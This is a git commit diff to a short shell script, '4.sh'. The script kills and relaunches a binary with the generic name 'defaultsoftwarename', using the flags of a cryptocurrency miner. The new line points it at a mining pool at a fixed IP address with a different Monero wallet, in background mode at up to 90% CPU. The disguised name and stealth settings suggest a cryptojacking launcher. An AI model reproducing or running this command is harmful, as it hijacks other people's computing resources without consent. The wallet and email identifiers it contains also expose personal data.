85889a695dd44bf3788aad29a62c21a8edb26b63
solscobbturpa <57539661+solscobbturpa@users.noreply.github.com>
2020-01-25 01:17:05 +0800

    Update 4.sh

--- 4.sh
+++ 4.sh
@@ -1,3 +1,3 @@
 pkill defaultsoftwarename
 sleep 7
-defaultsoftwarename -o 188.165.224.211:35213 -u 48moEJhh3YGNomdXrGwhXkfjN357cUHSe9euFXMLCwHaPo47K5oixUQiZizbbJ5cYfgnh4xYRyHt36hWhE3DyjRrRLBqshq --pass=x:solscobbturpa@gmail.com --rig-id=03 -B --donate-level=0 --print-time=30 --threads=defaultthreads --cpu-priority=4 --background --max-cpu-usage=90 --av=1
+defaultsoftwarename -o 188.165.224.211:10001 -u 45wui8xTuZFQk7A6pFv8Dka9zsoTSXpwe1Wyx9pRD18SKzRJiCJ5ovXgkkDUiDvBhKJNkiEbCgBUDPHTJZj6KdbLSaCrgc9 --pass=x:solscobbturpa@gmail.com --rig-id=01 -B --donate-level=0 --print-time=30 --threads=defaultthreads --cpu-priority=4 --background --max-cpu-usage=90 --av=1
